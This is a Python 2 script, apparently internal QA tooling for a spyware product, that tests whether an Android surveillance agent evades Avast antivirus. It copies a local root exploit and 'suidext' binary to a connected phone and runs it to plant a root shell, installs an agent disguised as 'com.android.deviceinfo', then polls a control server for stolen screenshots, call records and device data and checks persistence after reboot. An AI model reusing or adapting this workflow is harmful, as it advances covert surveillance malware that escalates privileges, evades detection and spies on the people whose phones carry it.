import sys
import csv
import time
import datetime
import traceback
import collections
from com.dtmilano.android.adb.adbclient import AdbClient
import adb


#sys.path.append("/Users/olli/Documents/work/AVTest/")
#sys.path.append("/Users/mlosito/Sviluppo/Rite/scripts/mobile")
sys.path.append("/Users/mlosito/Sviluppo/Rite/")
#sys.path.append("/Users/mlosito/Sviluppo/Rite/AVAgent/")
from AVAgent import build

apk = 'assets/installer.default.apk'
service = 'com.android.deviceinfo'


avs_to_test = ['avast']

wifi_av_network_conf = 'avassets/wpa_supplicant.conf'

avs_apk = {'avast': 'avassets/avast/com.avast.android.mobilesecurity-1.apk'}
avs_conf_file = {'avast': 'avassets/avast/data/com.avast.android.mobilesecurity/shared_prefs/prefs.xml'}
avs_conf_destination_dir = {'avast': '/data/data/com.avast.android.mobilesecurity/shared_prefs/'}
avs_launch_activity = {'avast': 'com.avast.android.mobilesecurity/com.avast.android.mobilesecurity.app.home.StartActivity'}
avs_apk_to_uninstall = {'avast': 'com.avast.android.mobilesecurity'}

def test_av(dev, av, results):

    adb.install(avs_apk[av], dev)

    install_rilcap_shell(dev)

    install_av_configuration(avs_conf_file['avast'], avs_conf_destination_dir['avast'], dev)

    start_av(dev)

def clean_av(dev, av):
    adb.uninstall(avs_apk_to_uninstall[av], dev)

def install_rilcap_shell(devSerialN):
    #installs (to tmp) necessary files for root (rilcap shell installing)
    adb.copy_tmp_file("avassets/android_exploit/local_exploit", devSerialN)
    adb.copy_tmp_file("avassets/android_exploit/suidext", devSerialN)
    #installs RILCAP
    adb.call('shell /data/local/tmp/in/local_exploit "suidext rt"', devSerialN)

def install_av_configuration(file_local, remote_path, dev):
    adb.copy_file(file_local, remote_path, True, dev)

def start_av(dev):
    adb.execute("am start -n" + avs_launch_activity['avast'], dev) # com.avast.android.mobilesecurity/com.avast.android.mobilesecurity.app.home.StartActivity"

def start_wifi_av_network(dev):
    adb.copy_file(wifi_av_network_conf, '/data/misc/wifi', True, dev)
    adb.executeSU('svc wifi disable', True, dev)
    adb.executeSU('svc wifi enable', True, dev)

def test_device(device, av, results):
     # extracts serial number (cannot pass an object to command line!)
    dev = device.serialno
    adb.uninstall(service, dev)


    #delete current av
    #TODO delete ALL the avs!
    clean_av(dev, av)

    #Starts av installation and stealth check)
    test_av(dev, av, results)

    print "Antivirus installed, configured and launched!"

    start_wifi_av_network(dev)

    #return "forced stop"

    if not adb.install(apk, dev):
        return "installation failed"

    results["installed"] = True
    if not adb.executeGui(service, dev):
        return "execution failed"
    else:
        results["executed"] = True

    time.sleep(120)

    # no skype bacause we have no real network in av testing

    # print "Skype call and sleep"
    # device.shell("am start -a android.intent.action.VIEW -d skype:echo123?call")
    #
    # time.sleep(120)

    print "slept"

    # sync e verifica

    with build.connection() as c:
        operation = "Invisibility"
        target_name = "Test 9_3"

        assert c
        if not c.logged_in():
            return("Not logged in")
        else:
            print "logged in"

        operation_id, group_id = c.operation(operation)
        target_id = c.targets(operation_id, target_name)[0]
        print "target_id: %s" % target_id

        instances = []
        while not instances:
            #print "operation: %s, %s" % (operation_id, group_id)
            print "waiting for sync"
            instances = c.instances_by_deviceid(results["id"], operation_id)
            time.sleep(10)

        instance_id = instances[0]['_id']
        print "instance_id: %s " % instance_id

        info = c.instance_info(instance_id)
        results['instance_name'] =  info['name']
        print "instance_info name: %s" % info['name']

        info_evidences = []
        counter = 0
        while not info_evidences and counter < 10:
            infos =  c.infos( target_id, instance_id)
            info_evidences = [ e['data']['content'] for e in infos if 'Root' in e['data']['content'] ]
            counter +=1
            time.sleep(10)

        print "info_evidences: %s: " % info_evidences
        if not info_evidences:
            results['root'] = 'No'
            return "No root"

        results['info'] = len(info_evidences) > 0
        root_method = info_evidences[0]
        results['root'] = root_method

        roots = [ r for r in info_evidences if 'previous' not in r ]
        print "roots: %s " % roots
        assert len(roots) == 1

        # get "Root: "
        # togliere previous, ne deve rimanere uno

        evidences =  c.evidences( target_id, instance_id )
        print evidences
        device_evidences = [ e['data']['content'] for e in evidences if e['type']=='device' ]
        screenshot_evidences = [ e for e in evidences if e['type']=='screenshot' ]
        call_evidences = [ e for e in evidences if e['type']=='call' ]
        print len(device_evidences), len(screenshot_evidences), len(call_evidences)

        #assert len(device_evidences) > 0
        #assert len(screenshot_evidences) > 0

        type_evidences = set()
        for e in evidences:
            type_evidences.add(e['type'])
        print type_evidences

        results['evidences'] = type_evidences

        #print info_evidences[0].encode('utf-8')
        #for ev in info_evidences:
        #    print [ e for e in ev.split('\n') if "Root" in e ]

    #uninstall
    print device.shell('rilcap qzx "ls -R /data/data/com.android.deviceinfo/files"')
    print "uninstall"
    adb.uninstall(service, dev)

    print "reboot"
    adb.reboot(dev)
    time.sleep(120)

    processes = adb.ps(dev)
    running = "persistence: %s" % service in processes
    results['running'] = running

    return True

def do_test(device, av):
    ##ML build.connection.host = "rcs-minotauro"
    device_id = get_deviceId(device)

    assert device_id
    assert len(device_id) >= 8

    with open('tmp/test-%s-%s.csv' % (device_id, av), 'wb') as csvfile:
    # write header
        devicelist = csv.writer(csvfile, delimiter=";",
                                quotechar="|", quoting=csv.QUOTE_MINIMAL)

        #devicelist.writerow(results.keys())
        #props = get_properties(device, "ro.product.manufacturer", "build.model", "build.selinux.enforce", "build.version.release")
        props = get_properties(device, av, "ro.product.manufacturer", "ro.product.model", "ro.build.selinux.enforce", "ro.build.version.release")
        print props
        devicelist.writerow(props.values())

def get_properties(device, av, *props):

    def get_property(device, prop_name):
        return device.getProperty(prop_name)

    res = {}
    for prop in props:
        if "." in prop:
            name = prop.split(".")[-1]
        else:
            name = prop
        res[name] = get_property(device, prop)
    print res

    dev_name = "%s %s" % (res["manufacturer"], res["model"])
    dev_id = get_deviceId(device)

    results = collections.OrderedDict()
    results['time'] = "%s" % datetime.datetime.now()
    results['device'] = dev_name
    results['antivirus'] = av
    results['id'] = dev_id
    results['release'] = res["release"]
    results['selinux'] = res["enforce"]
    results['error'] = ""
    results["return"] = ""

    try:
        ret = test_device(device, av, results)
        results["return"] = ret
        print "return: %s " % ret
    except Exception, ex:
        traceback.print_exc(dev_id)
        results['error'] = "%s" % ex

    return results

def get_deviceId(device):
    d_out = device.shell("dumpsys iphonesubinfo")
    lines = d_out.strip()
    devline = lines.split("\n")[2]
    dev_id = devline.split("=")[1].strip()
    return dev_id

def main():
    devices = adb.get_attached_devices()

    print """
    !!! Test AntiVirus !!!
    !!! Attenzione:    !!!
    !!! Prima dell'installazione dell'agente, al dispositivo va impedito il libero accesso ad internet. !!!

    Questa e' una demo quindi suppone di avere tutti i files nella cartella avassets

    """

    print """ prerequisiti:
    1) Telefono connesso in USB,
    2) USB Debugging enabled (settings/developer options/usb debugging)
    3) connesso wifi TP-LINK_9EF638 <======== NB!!!!!!!!!!!!!!!!!!!!!!!
    4) screen time 2m (settings/display/sleep)
    """

    print "devices connessi:"
    for device in devices:
        print device

    dev = None
    if not devices:
        print "non ci sono device connessi"
    else:

        if len(devices) > 1:
            dev = raw_input("su quale device si vuole eseguire il test? ")
            print "Eseguo il test su %s" % dev

        if len(sys.argv) >= 2:
            serialno = sys.argv[1]
        else:
            serialno = '.*'
        device = AdbClient(serialno=serialno)
        for av in avs_to_test:
            do_test(device,av)

    print "Fine."

if __name__ == "__main__":
    main()
